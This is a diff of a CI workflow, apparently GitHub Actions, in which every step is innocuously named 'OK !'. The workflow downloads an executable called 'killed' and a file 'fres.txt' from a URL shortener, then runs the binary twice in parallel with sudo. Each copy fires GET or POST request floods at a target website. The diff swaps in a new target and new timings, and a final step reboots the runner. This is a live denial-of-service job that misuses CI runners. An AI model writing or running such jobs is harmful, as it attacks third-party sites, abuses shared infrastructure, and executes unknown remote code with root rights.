@@ -15,12 +15,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/Gf1Ke/killed
-          wget https://curl.by/QHcZt/fres.txt
+          wget https://curl.by/08xBx/killed
+          wget https://curl.by/MGXWb/fres.txt
           chmod +x killed
           PIDS=()
           for i in {1..2}; do
-            sudo timeout 120 ./killed GET http://176.65.132.8/ fres.txt 110 900 10 &
+            sudo timeout 105 ./killed POST https://kuropanel.com/index.html fres.txt 100 250 10 &
             PIDS+=($!)
           done
           
@@ -29,7 +29,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 120
+        run: sleep 105
         
       - name: OK !
         run: sudo reboot
